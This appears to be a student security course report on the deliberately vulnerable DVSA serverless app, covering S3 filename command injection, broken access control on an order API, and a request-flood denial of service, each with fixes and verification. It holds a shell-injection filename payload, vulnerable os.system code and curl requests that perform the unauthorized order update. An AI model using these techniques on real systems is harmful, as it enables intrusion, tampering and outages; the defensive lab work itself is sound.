| Feedback S3 Bucket | dvsa-feedback-bucket-986263532904-us-east-1 |

## Part 1) Goal and Vulnerability Summary

Lesson #4 shows an Insecure Cloud Configuration issue in the DVSA feedback upload feature. The main affected parts are the S3 feedback bucket, the S3 event notification connected to the bucket, and the DVSA-FEEDBACK-UPLOADS Lambda function that processes uploaded files.

The problem is that the system allows attacker-controlled file names, or S3 object keys, to reach backend processing. Since the Lambda function used the uploaded object name in an unsafe command operation, a malicious filename could be interpreted as command syntax instead of normal data.

The impact is serious because an attacker can upload a specially named file and cause unintended command execution inside the Lambda environment. At a high level, the vulnerability comes from two weaknesses together: permissive S3 upload configuration and unsafe processing of S3 event data in the backend.

## Part 2) Why This Works / Root Cause

The vulnerability is possible because the feedback upload path allows attacker-controlled file names to become S3 object keys, and the downstream Lambda processing path treats the object key as trusted input. In the vulnerable code, the S3 object key is URL-decoded and inserted into an os.system command. If the filename contains shell metacharacters such as a semicolon, the filename can alter the command executed by the Lambda runtime. The object key should be treated only as untrusted metadata, but the vulnerable behavior lets it become executable shell syntax.

filename = parse.unquote_plus(event["Records"][0]["s3"]["object"]["key"])

os.system("touch /tmp/{} /tmp/{}.txt".format(filename, filename)) # unsafe

![Lesson 4 evidence 1](evidence/lesson-04-evidence-01.png)

_Figure L4-1: Vulnerable DVSA-FEEDBACK-UPLOADS code before the fix. The S3 object key is decoded and passed into os.system(), enabling command injection through the uploaded filename._

## Part 3) Environment and Setup

| Field | Value |
| --- | --- |
| AWS Region | us-east-1 / N. Virginia |
| DVSA Website | http://dvsa-website-986263532904-us-east-1.s3-website-us-east-1.amazonaws.com/ |
| DVSA API Base | https://s96kq7yks4.execute-api.us-east-1.amazonaws.com/dvsa |
| Workflow | Feedback/contact form file upload |
| Lambda | DVSA-FEEDBACK-UPLOADS |
| Log group | /aws/lambda/DVSA-FEEDBACK-UPLOADS |
| S3 bucket | dvsa-feedback-bucket-986263532904-us-east-1 |
| Tools | AWS Console, DVSA website, CloudWatch Logs, S3 Console, macOS Terminal, curl |

![Lesson 4 evidence 2](evidence/lesson-04-evidence-02.png)

_Figure L4-2: Lambda environment variables showing FEEDBACK_BUCKET = dvsa-feedback-bucket-986263532904-us-east-1 and ORDERS_TABLE = DVSA-ORDERS-DB._

![Lesson 4 evidence 3](evidence/lesson-04-evidence-03.png)

_Figure L4-3: S3 event notification before remediation. All object create events in the feedback bucket invoke a Lambda function, connecting S3 uploads to DVSA-FEEDBACK-UPLOADS processing._

![Lesson 4 evidence 4](evidence/lesson-04-evidence-04.png)

_Figure L4-4: Feedback bucket before remediation with Block all public access turned off._

![Lesson 4 evidence 5](evidence/lesson-04-evidence-05.png)

_Figure L4-5: Feedback bucket policy before remediation. Principal "*" was allowed to PutObject, PutObjectAcl, GetObject, and DeleteObject on bucket objects._

![Lesson 4 evidence 6](evidence/lesson-04-evidence-06.png)

_Figure L4-6: Object Ownership before remediation. The bucket used Object writer ownership and ACLs were enabled._

## Part 4) Reproduction Steps

Confirm that the AWS Console is using the us-east-1 / N. Virginia region.

Identify the affected Lambda function, DVSA-FEEDBACK-UPLOADS, which handles the feedback file upload workflow.

Confirm the feedback bucket used by the function from the FEEDBACK_BUCKET environment variable.

Review the S3 feedback bucket configuration and confirm that object-create events are connected to the feedback upload Lambda function.

Review the bucket permissions and confirm the insecure configuration: Block Public Access was disabled, and the bucket policy allowed public object-level actions.

Prepare a proof-of-concept filename that contains command syntax but only prints a harmless marker:

cat.png; echo ICS344_L4_SUCCESS; #

Submit the file through the normal DVSA feedback form.

Verify that the uploaded object appears in the S3 feedback bucket with the malicious object key preserved.

Check the CloudWatch log group for /aws/lambda/DVSA-FEEDBACK-UPLOADS and search for:

ICS344_L4_SUCCESS

The appearance of ICS344_L4_SUCCESS in CloudWatch confirms that the S3 object key was processed unsafely and reached command execution inside the Lambda environment.

mkdir -p ~/ics344_lesson4

cd ~/ics344_lesson4

touch "cat.png; echo ICS344_L4_SUCCESS; #"

ls -la

![Lesson 4 evidence 7](evidence/lesson-04-evidence-07.png)

_Figure L4-7: Terminal screenshot showing creation of the benign malicious filename cat.png; echo ICS344_L4_SUCCESS; #._

![Lesson 4 evidence 8](evidence/lesson-04-evidence-08.png)

_Figure L4-8: DVSA feedback form accepted the malicious filename and displayed the generic Sent Thank you message before remediation._

![Lesson 4 evidence 9](evidence/lesson-04-evidence-09.png)

_Figure L4-9: S3 feedback bucket containing the uploaded object key with the malicious command marker preserved in the filename._

## Part 5) Evidence and Proof

The vulnerability is proven by the CloudWatch marker. A normal feedback upload should not print ICS344_L4_SUCCESS. After uploading a file named cat.png; echo ICS344_L4_SUCCESS; #, the marker appeared in CloudWatch Logs for DVSA-FEEDBACK-UPLOADS. This shows that the S3 object key reached shell command processing and that the injected echo command executed in the Lambda runtime.

| Evidence item | What it proves | Screenshot |
| --- | --- | --- |
| Feedback bucket and event notification | Shows uploaded objects can trigger Lambda processing. | Figures L4-2 and L4-3 |
| Bucket policy and public access settings | Shows insecure cloud configuration allowing public object manipulation. | Figures L4-4 and L4-5 |
| Vulnerable Lambda code | Shows S3 object key is inserted into os.system(). | Figure L4-1 |
| Malicious S3 object key | Shows the payload filename was preserved in S3. | Figure L4-9 |
| CloudWatch marker | Shows command execution via ICS344_L4_SUCCESS. | Figure L4-10 |

![Lesson 4 evidence 10](evidence/lesson-04-evidence-10.png)

_Figure L4-10: CloudWatch Logs before the fix showing ICS344_L4_SUCCESS. This is the main exploit proof for Lesson 4._

## Part 6) Fix Strategy / Probable Mitigation

The fix should be done in both the Lambda code and the S3 bucket settings. The Lambda must stop using uploaded object names inside shell commands, and it should validate filenames before processing them. The S3 bucket also needs to be hardened by removing public read/write/delete access and enabling stricter access controls. This prevents malicious filenames from executing commands and reduces public S3 misuse.

| Fix layer | Fix | Why it works |
| --- | --- | --- |
| Lambda code | Remove os.system usage with S3 object keys and use safe Python file operations. | Prevents object keys from becoming shell commands. |
| Filename validation | Reject shell metacharacters, path separators, and unsupported characters. | Blocks malicious names such as cat.png; echo ...; #. |
| S3 bucket | Enable Block Public Access and remove public object read/write/delete permissions. | Prevents unintended direct public writes to the bucket. |
| Transport security | Add DenyInsecureTransport bucket policy. | Denies non-HTTPS access. |
| Normal behavior | Allow safe filenames through the intended DVSA feedback workflow. | Preserves legitimate functionality. |

## Part 7) Code / Config Changes

### 7.1 Lambda code before fix

filename = parse.unquote_plus(event["Records"][0]["s3"]["object"]["key"])

if not is_safe(filename):

return {"status": "error", "message": "invalid filename"}

os.system("touch /tmp/{} /tmp/{}.txt".format(filename, filename))

### 7.2 Lambda code after fix

The patched Lambda keeps the same overall structure but adds real filename validation and replaces shell execution with direct Python file operations. The fix rejects unsafe filenames before generating a presigned upload and again before processing S3 Records events.

if "file" in event:

if not is_safe(event["file"]):

return json.dumps({"status": "err", "msg": "invalid filename"})

elif "Records" in event:

filename = parse.unquote_plus(event["Records"][0]["s3"]["object"]["key"])

if not is_safe(filename):

print("Rejected unsafe S3 object key:" + filename)

return {"status": "error", "message": "invalid filename"}

open(os.path.join("/tmp", filename), "a").close()

open(os.path.join("/tmp", filename + ".txt"), "a").close()

print("Processed safe uploaded object:" + filename)

return {"status": "ok", "message": "processed safely"}

![Lesson 4 evidence 11](evidence/lesson-04-evidence-11.png)

_Figure L4-11: Fixed Lambda code after deployment. Unsafe filenames are rejected before generating a presigned S3 upload URL._

![Lesson 4 evidence 12](evidence/lesson-04-evidence-12.png)

_Figure L4-12: Fixed is_safe() validation logic. Dangerous shell-control characters and path separators are rejected._

### 7.3 S3 bucket hardening after fix

The S3 bucket was hardened by enabling Block all public access and replacing the old public allow policy with a policy that denies insecure non-HTTPS access. The dangerous Principal "*" allow statement for PutObject, PutObjectAcl, GetObject, and DeleteObject was removed.

{

"Version": "2012-10-17",

"Statement": [

{

"Sid": "DenyInsecureTransport",

"Effect": "Deny",

"Principal": "*",

"Action": "s3:*",

"Resource": [

"arn:aws:s3:::dvsa-feedback-bucket-986263532904-us-east-1",

"arn:aws:s3:::dvsa-feedback-bucket-986263532904-us-east-1/*"

],

"Condition": {

"Bool": {

"aws:SecureTransport": "false"

}

}

}

]

}

![Lesson 4 evidence 13](evidence/lesson-04-evidence-13.png)

_Figure L4-13: S3 feedback bucket after remediation with Block all public access enabled._

![Lesson 4 evidence 14](evidence/lesson-04-evidence-14.png)

_Figure L4-14: Feedback bucket policy after remediation. The public allow statement was removed and the remaining policy denies insecure transport._

## Part 8) Verification After Fix

After deploying the Lambda fix, the malicious filename was uploaded again. The DVSA frontend still showed its generic success message, but backend verification showed the fix worked: CloudWatch logged that the unsafe S3 object key was rejected, and no new command-output execution marker was produced after the post-fix timestamp.

![Lesson 4 evidence 15](evidence/lesson-04-evidence-15.png)

_Figure L4-15: CloudWatch post-fix log showing Rejected unsafe S3 object key: cat.png; echo ICS344_L4_SUCCESS; #._

Normal behavior was then verified using a safe file name. The normal_feedback.txt upload succeeded through the DVSA feedback form, appeared in the S3 bucket, and was processed safely by the Lambda function.

![Lesson 4 evidence 16](evidence/lesson-04-evidence-16.png)

_Figure L4-16: Normal DVSA feedback upload after the code fix using normal_feedback.txt._

![Lesson 4 evidence 17](evidence/lesson-04-evidence-17.png)

_Figure L4-17: S3 bucket after normal upload. A safe normal_feedback.txt object appears alongside earlier test objects._

![Lesson 4 evidence 18](evidence/lesson-04-evidence-18.png)

_Figure L4-18: CloudWatch post-fix log showing Processed safe uploaded object for normal_feedback.txt._

The S3 cloud-configuration fix was also verified with an unauthenticated public PUT request. The request returned HTTP 403 AccessDenied, proving that public direct writes to the feedback bucket are no longer allowed. Finally, a normal DVSA feedback upload still worked after the bucket policy hardening.

curl -i -X PUT -data "public write test" "https://dvsa-feedback-bucket-986263532904-us-east-1.s3.us-east-1.amazonaws.com/public-write-test-after-fix.txt"

![Lesson 4 evidence 19](evidence/lesson-04-evidence-19.png)

_Figure L4-19: Public unauthenticated PUT request after S3 hardening. The request is denied with HTTP 403 AccessDenied._

![Lesson 4 evidence 20](evidence/lesson-04-evidence-20.png)

_Figure L4-20: Normal DVSA feedback upload still works after S3 bucket hardening._

## Part 9) Structured Operation and Security Analysis

### 9.1 Intended Logic and Security Rule(s)

Under normal conditions, a logged-in DVSA user submits feedback and optionally attaches a file. The browser requests an upload path, the file is stored in the feedback S3 bucket, and S3 object-create events invoke DVSA-FEEDBACK-UPLOADS. The correct behavior is that the object key is treated only as untrusted metadata, validated, and processed safely without shell execution.

Rule 1: Only the intended application upload flow should write feedback attachments to S3.

Rule 2: S3 object names and event fields are untrusted input.

Rule 3: Object keys must never be concatenated into shell commands.

Rule 4: S3 bucket policies must not allow public object write/read/delete access.

Rule 5: The fix must block malicious names while preserving normal feedback upload.

### 9.2 Evidence Sources and Behavior Trace

| Case | Input / Action | Observed Behavior | Evidence |
| --- | --- | --- | --- |
| Normal intended behavior | Upload normal_feedback.txt through DVSA feedback form. | File accepted and processed safely. | Figures 16, 17, and 18 |
| Exploit behavior | Upload cat.png; echo ICS344_L4_SUCCESS; #. | CloudWatch printed ICS344_L4_SUCCESS before the fix. | Figures 8, 9, and 10 |
| Post-fix behavior | Repeat malicious upload after code fix. | Unsafe object key rejected; no new command execution marker produced. | Figure L4-15 |
| Post-cloud-hardening behavior | Unauthenticated public PUT to S3 bucket. | Request denied with HTTP 403 AccessDenied. | Figure L4-19 |

### 9.3 Deviation Analysis and Classification

The exploit deviates from the intended rule because an S3 object key, which should be metadata, was interpreted as shell command syntax. The CloudWatch ICS344_L4_SUCCESS marker proves the violation because that string was produced by the injected echo command in the filename. The case is classified as Intentional misuse / security-relevant abuse. The permissive bucket policy and Block Public Access setting also represent Accidental misconfiguration because they expanded the ways objects could be written or manipulated in the bucket.

### 9.4 Explainable Fix and Post-Fix Validation

The incorrect assumption was that uploaded S3 object keys could be safely used in backend command processing. The fix belongs in DVSA-FEEDBACK-UPLOADS and in the S3 bucket configuration. The Lambda code now validates filenames and does not call os.system with object keys. The S3 bucket now blocks public access and no longer has a public allow policy for object read/write/delete actions. Post-fix validation showed malicious names are rejected, safe names still process, and public unauthenticated writes are denied.

## Table A - Structured Analysis Summary

| Vulnerability | Intended Rule(s) | Artifacts Used to Infer Rule | Normal Behavior Evidence | Exploit Behavior Evidence |
| --- | --- | --- | --- | --- |
| Lesson #4: Insecure Cloud Configuration | Feedback uploads must use intended paths; S3 object names are data only; Lambda must not execute object keys; the bucket must not allow public object writes/deletes. | DVSA feedback workflow, Lambda code, S3 event notification, bucket policy, Block Public Access setting, S3 objects, terminal output, and CloudWatch logs. | normal_feedback.txt was accepted, appeared in S3, and CloudWatch logged Processed safe uploaded object. | cat.png; echo ICS344_L4_SUCCESS; # appeared in S3, and CloudWatch printed ICS344_L4_SUCCESS before the fix. |

## Table B - Structured Analysis Summary

| Vulnerability | Why This Is a Deviation | Deviation Class | Fix Applied (Where) | Post-Fix Verification | Optional Latency Before / After Logging |
| --- | --- | --- | --- | --- | --- |
| Lesson #4: Insecure Cloud Configuration | An S3 object key was executed as shell syntax instead of treated as data; the bucket also allowed broad public object actions before remediation. | Intentional misuse / security-relevant abuse; plus accidental misconfiguration for public bucket permissions. | DVSA-FEEDBACK-UPLOADS: validate filenames and remove os.system. S3: enable Block Public Access, remove public allow policy, add DenyInsecureTransport. | Malicious key rejected; normal file processed safely; unauthenticated public PUT returned 403 AccessDenied. | N/A |

## Part 10) Takeaway / Lessons Learned

This lesson shows that cloud security problems often appear at the boundary between configuration and code. In a serverless architecture, an uploaded S3 object can automatically trigger Lambda code, so S3 object names, metadata, and event fields must be treated as untrusted input. The main secure design lesson is defense in depth: restrict who can upload to the bucket, validate filenames and file types, avoid shell execution with user-controlled data, and remove public storage permissions that are not required for the application workflow.

## Appendix A - Final Evidence Checklist

| Evidence | Status | Location |
| --- | --- | --- |
| Vulnerable code before fix | Complete | Figure L4-1 |
| Feedback bucket name and environment variables | Complete | Figure L4-2 |
| S3 event notification | Complete | Figure L4-3 |
| S3 bucket permissions before fix | Complete | Figures 4, 5, and 6 |
| Malicious filename and upload | Complete | Figures 7, 8, and 9 |
| CloudWatch exploit proof | Complete | Figure L4-10 |
| Fixed Lambda code | Complete | Figures L4-11 and L4-12 |
| Post-fix malicious rejection | Complete | Figure L4-15 |
| Normal upload verification | Complete | Figures 16, 17, and 18 |
| S3 hardening verification | Complete | Figures 13, 14, 19, and 20 |

## Appendix B - Sources Used

ICS344 Project Description PDF: required 10-part structure, evidence, fix, verification, structured tables, and grading rules.

ICS344 Project Description PDF: Lesson #4 description requiring S3 upload/cloud misconfiguration demonstration, unsafe Lambda processing, and fixes for bucket policy, object-name validation, and command execution.

ICS344 Helper Guide PDF: DVSA deployment and us-east-1 environment guidance.

OWASP DVSA official project repository: https://github.com/OWASP/DVSA


---

# Lesson #5: Broken Access Control

| Field | Value |
| --- | --- |
| Course / Term | ICS344: Information Security / Term 252 |
| Student | Hussain Albaggal |
| Lesson | Lesson #5: Broken Access Control |
| DVSA Website | http://dvsa-website-986263532904-us-east-1.s3-website-us-east-1.amazonaws.com/ |
| API Endpoint Used | https://s96kq7yks4.execute-api.us-east-1.amazonaws.com/dvsa/order |
| AWS Region | us-east-1 (United States, N. Virginia) |
| Main Components | API Gateway, DVSA-ORDER-MANAGER, DVSA-ORDER-UPDATE, DynamoDB DVSA-ORDERS-DB |
| Main Proof Order ID | 3ef3cd09-4511-43c9-9f85-ae118c2ac6a6 |
| Post-fix Normal Order ID | c11c5422-abaf-4c90-8540-d397735c156e |

## Part 1) Goal and Vulnerability Summary

Lesson #5 demonstrates a Broken Access Control issue in the DVSA order workflow. The affected part is the public /dvsa/order API, which is handled by the DVSA-ORDER-MANAGER Lambda function. This function routes user requests to backend order functions, including the update function.

The problem is that a normal authenticated user can directly call the update action and modify an existing order's stored items. In the test case, the order was changed without admin permission and without completing payment. This is a serious issue because order modification should be controlled by the backend workflow, not by any direct request from a normal user.

At a high level, the weakness is missing server-side authorization for a sensitive order update operation. The system checks that the user is logged in, but it does not properly check whether the user is allowed to perform that update action.

## Part 2) Why This Works / Root Cause

The vulnerability is possible because the backend trusts any authenticated user who sends action="update" to the public order API. Before the fix, the update case in order-manager.js did not check whether the user was an administrator or whether the order was in a state that should allow modification. It simply forwarded the user, order ID, and items to DVSA-ORDER-UPDATE. This violates the rule that privileged or sensitive state-changing actions must be authorized on the backend, not only hidden from the frontend UI.

// Before fix - vulnerable update case case "update": payload = { "user": user, "orderId": req["order-id"], "items": req["items"] }; functionName = "DVSA-ORDER-UPDATE"; break;

## Part 3) Environment and Setup

| Item | Value |
| --- | --- |
| AWS Region | us-east-1 / N. Virginia |
| DVSA Website | http://dvsa-website-986263532904-us-east-1.s3-website-us-east-1.amazonaws.com/ |
| API Endpoint | https://s96kq7yks4.execute-api.us-east-1.amazonaws.com/dvsa/order |
| DynamoDB Table | DVSA-ORDERS-DB |
| Lambda Function Changed | DVSA-ORDER-MANAGER |
| Tools Used | Chrome DevTools, macOS Terminal, curl, jq, AWS Lambda Console, DynamoDB Console |
| Token Handling | Authorization token was used locally but redacted from screenshots/report. |

## Part 4) Reproduction Steps

A normal non-admin DVSA user session was used, and the Authorization token was taken from a browser request to /dvsa/order. The token is not included in the report.

A new order was created through the public /dvsa/order API using cart-id value cart-l5-simple and item 11 with quantity 1.

The API returned the new order ID: 3ef3cd09-4511-43c9-9f85-ae118c2ac6a6

Shipping information was added to the same order using the normal public shipping action.

Without admin privileges and without completing payment, the same normal user sent a direct update request for the same order.

The update request changed the order items from item 11 quantity 1 to item 12 quantity 5.

DynamoDB table DVSA-ORDERS-DB was checked after the request. The order record showed itemList changed to {"12":5}, while orderStatus stayed 100 and totalAmount stayed 0.

This confirmed that the backend allowed a normal authenticated user to modify stored order contents without payment or admin approval.

# Create order as normal user

curl -s -X POST "$API" \ -H "Content-Type: application/json" \ -H "Authorization: $TOKEN" \ --data-raw '{"action":"new","cart-id":"cart-l5-simple","items":{"11":1}}' | jq

Add shipping information

curl -s -X POST "$API" \ -H "Content-Type: application/json" \ -H "Authorization: $TOKEN" \ --data-raw "{\"action\":\"shipping\",\"order-id\":\"$ORDER_ID\",\"data\":{\"name\":\"Hussain\",\"email\":\"test@example.com\",\"address\":\"Al Sharqiya\"}}" | jq

Broken access-control exploit: update without admin/payment

curl -s -X POST "$API" \ -H "Content-Type: application/json" \ -H "Authorization: $TOKEN" \ --data-raw "{\"action\":\"update\",\"order-id\":\"$ORDER_ID\",\"items\":{\"12\":5}}" | jq

![Lesson 5 evidence 1](evidence/lesson-05-evidence-01.png)

_Figure L5-1: A normal user creates a new order through the public /dvsa/order API. The returned order ID is 3ef3cd09-4511-43c9-9f85-ae118c2ac6a6._

![Lesson 5 evidence 2](evidence/lesson-05-evidence-02.png)

_Figure L5-2: Shipping information is added to the newly created order before payment._

![Lesson 5 evidence 3](evidence/lesson-05-evidence-03.png)

_Figure L5-3: The normal user directly calls the update action and receives a successful cart updated response._

## Part 5) Evidence and Proof

The vulnerability is proven by combining the successful update API response with the authoritative DynamoDB record. The public update request returned {"status":"ok","msg":"cart updated"} even though the user was not an administrator and no payment was completed. DynamoDB confirmed that order 3ef3cd09-4511-43c9-9f85-ae118c2ac6a6 was modified to itemList {"12":{"N":"5"}} while orderStatus remained 100 and totalAmount remained 0. This proves broken access control because the backend allowed a regular user to modify stored order contents through an update path that should have been restricted.

| Evidence | What it proves | Screenshot |
| --- | --- | --- |
| Create order response | Shows a normal user can create order 3ef3cd09-4511-43c9-9f85-ae118c2ac6a6 with item 11 quantity 1. | Figure L5-1 |
| Update action response | Shows the same normal user receives cart updated from the public update action. | Figure L5-3 |
| DynamoDB record | Shows stored itemList changed to item 12 quantity 5 while orderStatus stayed 100 and totalAmount stayed 0. | Figure L5-4 |

![Lesson 5 evidence 4](evidence/lesson-05-evidence-04.png)

_Figure L5-4: DynamoDB DVSA-ORDERS-DB after the exploit. The order ID 3ef3cd09-4511-43c9-9f85-ae118c2ac6a6 shows itemList changed to item 12 quantity 5; the order remains unpaid/not completed with orderStatus 100 and totalAmount 0._

![Lesson 5 evidence 5](evidence/lesson-05-evidence-05.png)

_Figure L5-5: Zoomed DynamoDB evidence highlighting the same modified order record._

## Part 6) Fix Strategy / Probable Mitigation

The fix belongs in the backend order manager, not the user interface. The update action must enforce server-side authorization before invoking DVSA-ORDER-UPDATE. In this implementation, the update case was changed so only users whose Cognito custom:is_admin attribute is true can invoke the order update backend function. Non-admin users now receive a 403 Unauthorized response. This addresses the root cause because the sensitive update path is no longer reachable by ordinary authenticated users.

| Fix layer | Purpose |
| --- | --- |
| Backend authorization | Require isAdmin == "true" before executing action update. |
| Fail closed | Return 403 Unauthorized and stop execution for non-admin users. |
| Preserve normal behavior | Keep normal order creation and non-sensitive order workflow actions working. |
| Recommended defense in depth | Also validate order ownership and order state transitions in DVSA-ORDER-UPDATE itself. |

## Part 7) Code / Config Changes

Changed component: AWS Lambda function DVSA-ORDER-MANAGER, source file order-manager.js. The vulnerable update case originally invoked DVSA-ORDER-UPDATE for any authenticated user. The fixed code adds an administrator check and returns 403 Unauthorized for non-admin users.

// Before fix case "update": payload = { "user": user, "orderId": req["order-id"], "items": req["items"] }; functionName = "DVSA-ORDER-UPDATE"; break;

![Lesson 5 evidence 6](evidence/lesson-05-evidence-06.png)

_Figure L5-6: Vulnerable update case before remediation. Any authenticated user could invoke DVSA-ORDER-UPDATE._

// After fix case "update": if (isAdmin == "true") { payload = { "user": user, "orderId": req["order-id"], "items": req["items"] }; functionName = "DVSA-ORDER-UPDATE"; break; } else { isOk = false; const response = { statusCode: 403, headers: { "Access-Control-Allow-Origin": "*" }, body: JSON.stringify({ "status": "err", "message": "Unauthorized" }) }; callback(null, response); return; }

![Lesson 5 evidence 7](evidence/lesson-05-evidence-07.png)

_Figure L5-7: Fixed update case after remediation. The update path now requires isAdmin == true and rejects regular users._

## Part 8) Verification After Fix

After deploying the fixed order-manager.js code, the same update request was repeated as the same regular user. The request was rejected with HTTP 403 and {"status":"err","message":"Unauthorized"}. This confirms that the unauthorized update path was blocked. Normal order creation was then tested after the fix, and the API returned {"status":"ok","msg":"order created"}, proving the fix did not break normal order creation.

# Post-fix unauthorized update attempt

curl -i -s -X POST "$API" \ -H "Content-Type: application/json" \ -H "Authorization: $TOKEN" \ --data-raw "{\"action\":\"update\",\"order-id\":\"$ORDER_ID\",\"items\":{\"11\":9}}"

Normal order creation after fix

curl -s -X POST "$API" \ -H "Content-Type: application/json" \ -H "Authorization: $TOKEN" \ --data-raw '{"action":"new","cart-id":"cart-l5-normal-after-fix","items":{"11":1}}' | jq

![Lesson 5 evidence 8](evidence/lesson-05-evidence-08.png)

_Figure L5-8: Post-fix verification. The same regular user update request is rejected with Unauthorized / HTTP 403._

![Lesson 5 evidence 9](evidence/lesson-05-evidence-09.png)

_Figure L5-9: Normal order creation still works after the access-control fix._

## Part 9) Structured Operation and Security Analysis

### 9.1 Intended Logic and Security Rule(s)

Under normal conditions, a regular DVSA user may create a new order, add shipping data, and proceed through the expected checkout workflow. A regular user should not be able to directly modify stored order contents through a privileged update path after the order is created. Sensitive order modifications must require a verified administrative context or strict server-side workflow validation.

Rule 1: Authentication identifies the user but does not automatically authorize privileged updates.

Rule 2: The update action must be protected by backend authorization checks.

Rule 3: Order state and item changes must be validated server-side, not trusted from arbitrary API requests.

Rule 4: Non-admin users must receive a safe Unauthorized response for privileged update attempts.

Rule 5: Normal order creation should continue working after the fix.

### 9.2 Evidence Sources and Behavior Trace

| Case | Input / Action | Observed Behavior |
| --- | --- | --- |
| Normal behavior | Regular user creates an order with item 11 quantity 1. | API returns order created. |
| Exploit behavior | Same regular user sends action update with item 12 quantity 5. | API returns cart updated; DynamoDB record changes. |
| Post-fix behavior | Same update request repeated after admin check is added. | API returns Unauthorized; normal new order still works. |

### 9.3 Deviation Analysis and Classification

The exploit deviates from the intended rules because a regular authenticated user can directly modify order contents through a backend update path without admin authorization and without payment. The DynamoDB record is the authoritative proof that the backend accepted and persisted the unauthorized change. This is classified as Intentional misuse / security-relevant abuse, because the user intentionally calls a sensitive API action outside the intended workflow.

### 9.4 Explainable Fix and Post-Fix Validation

The incorrect assumption was that any authenticated user could safely access the update route. The fix belongs in DVSA-ORDER-MANAGER, where requests are routed to backend order functions. The update case was changed to require isAdmin == "true" and to return 403 Unauthorized for regular users. Post-fix validation showed that the same request is rejected, while normal order creation still succeeds.

## Table A - Structured Analysis Summary

| Vulnerability | Intended Rule(s) | Artifacts Used to Infer Rule | Normal Behavior Evidence | Exploit Behavior Evidence |
| --- | --- | --- | --- | --- |
| Lesson #5: Broken Access Control | Regular users may create orders, but must not directly perform privileged order updates. | /dvsa/order requests, order-manager.js, DynamoDB DVSA-ORDERS-DB, terminal curl output, AWS Lambda Console. | Normal order creation returned order created before and after the fix. | Update request returned cart updated and DynamoDB showed itemList changed to {"12":5} with orderStatus 100 and totalAmount 0. |

## Table B - Structured Analysis Summary

| Vulnerability | Why This Is a Deviation | Deviation Class | Fix Applied (Where) | Post-Fix Verification | Optional Latency Before / After Logging |
| --- | --- | --- | --- | --- | --- |
| Lesson #5: Broken Access Control | The backend allowed a regular user to update stored order contents without admin privileges or payment. | Intentional misuse / security-relevant abuse | Added admin check to case "update" in DVSA-ORDER-MANAGER/order-manager.js and returned 403 Unauthorized for non-admin users. | Same update request returned Unauthorized; normal order creation still returned order created. | N/A |

## Part 10) Takeaway / Lessons Learned

The main lesson is that authentication is not the same as authorization. A normal user token should allow the user to create and manage only permitted parts of their own order workflow, not perform privileged updates. In serverless applications, every Lambda routing path must enforce authorization on the backend. Hiding an action in the frontend is not enough. Sensitive state-changing operations must check user role, ownership, and order state before modifying DynamoDB.

## Appendix A) Screenshot Index

| Figure | Description |
| --- | --- |
| Figure L5-1 | Create order response as regular user |
| Figure L5-2 | Shipping update response |
| Figure L5-3 | Pre-fix unauthorized update exploit returning cart updated |
| Figure L5-4 | DynamoDB after exploit showing modified itemList |
| Figure L5-5 | DynamoDB zoomed evidence |
| Figure L5-6 | Vulnerable update case before fix |
| Figure L5-7 | Fixed update case after admin check |
| Figure L5-8 | Post-fix update rejected |
| Figure L5-9 | Normal order creation after fix |


---

# Lesson #6: Denial of Service (DoS)

| Lesson summary: The system allowed excessive concurrent requests without proper limits. By sending parallel requests, the attacker caused service instability, resulting in errors and degraded performance. |
| --- |

Main affected component: API Gateway throttling, Lambda concurrency, request handling under load

## Part 1) Goal and Vulnerability Summary

This lesson demonstrates a Denial of Service (DoS) vulnerability in the DVSA application.

The system allows multiple concurrent billing requests without proper restriction. An attacker can exploit this by sending many parallel requests, causing the system to become unavailable for legitimate users.

The affected component is the billing API endpoint and its backend Lambda function. The impact is service disruption due to overload.

## Part 2) Why This Works / Root Cause

The vulnerability exists because the system does not properly limit the number of incoming requests.

By sending many requests simultaneously using multiple threads, the attacker overwhelms the backend service. This leads to server errors (500 Internal Server Error), showing that the system cannot handle the load.

The absence of effective rate limiting allows this attack to succeed.

## Part 3) Environment and Setup

The test was performed on the DVSA application deployed on AWS.

Target API:

https://3zb40wtoy7.execute-api.us-east-1.amazonaws.com/dvsa/order

Tools used:

- Python

- requests library

- AWS API Gateway

The attack was implemented using a Python script that sends concurrent requests.

## Part 4) Reproduction Steps

1. A Python script was created to generate multiple concurrent requests.

2. The script continuously sends billing requests to the API.

3. The script was executed using python3 dos.py.

4. The system responses were observed in the terminal.

![Lesson 6 evidence 1](evidence/lesson-06-evidence-01.png)

_Figure L6-1: Python DoS script sending concurrent requests._

## Part 5) Evidence and Proof

The vulnerability was successfully demonstrated.

The system initially processed some requests, but quickly became overwhelmed. This resulted in multiple 500 Internal Server Error responses, indicating that the service was unable to handle the load.

Some requests still returned 200 responses, but many failed due to overload.

![Lesson 6 evidence 2](evidence/lesson-06-evidence-02.png)

_Figure L6-2: Before - repeated 500 errors during concurrent request test._

![Lesson 6 evidence 3](evidence/lesson-06-evidence-03.png)

_Figure L6-3: Before - server overload responses during DoS test._

## Part 6) Fix Strategy / Probable Mitigation

The vulnerability can be mitigated by applying rate limiting at the API Gateway level.

By restricting the number of requests per second, the system can prevent attackers from overwhelming the service.

This ensures that excessive traffic is rejected instead of being processed.

## Part 7) Code / Config Changes

The fix was applied by configuring rate limiting in API Gateway to control incoming traffic and prevent system overload.

The following steps were performed:

Open AWS Console and go to API Gateway.

Select the DVSA API and navigate to the "Stages" section.

![Lesson 6 evidence 4](evidence/lesson-06-evidence-04.png)

_Figure L6-4: API Gateway route connected to the order manager Lambda._

Select the active stage (dvsa) to view its configuration settings.

![Lesson 6 evidence 5](evidence/lesson-06-evidence-05.png)

_Figure L6-5: API Gateway stage selected for throttling configuration._

Enable throttling to limit the number of incoming requests.

Set the rate limit to 5 requests per second to control request frequency.

Set the burst limit to 10 to control short spikes in traffic.

Save the configuration to apply the new rate limiting settings.

![Lesson 6 evidence 6](evidence/lesson-06-evidence-06.png)

_Figure L6-6: After - throttling rate and burst limits configured._

## Part 8) Verification After Fix

After applying rate limiting, the attack was executed again using the same script.

This time, the system did not crash. Instead, it started rejecting excessive requests with 429 Too Many Requests responses.

This confirms that the DoS attack was successfully mitigated.

![Lesson 6 evidence 7](evidence/lesson-06-evidence-07.png)

_Figure L6-7: After - excessive requests rejected with 429 Too Many Requests._

## Part 9) Structured Operation and Security Analysis

The following tables summarize the expected and exploited behaviors before and after applying the fix.

## Table A

| Vulnerability | Intended Rule(s) | Artifacts Used | Normal Behavior | Exploit Behavior |
| --- | --- | --- | --- | --- |
| DoS Attack | System should handle limited traffic | Python, API, requests | Requests processed normally | Server overload (500 errors) |

## Table B

| Vulnerability | Deviation | Class | Fix Applied | Post-Fix Verification | Optional Latency Before / After Logging |
| --- | --- | --- | --- | --- | --- |
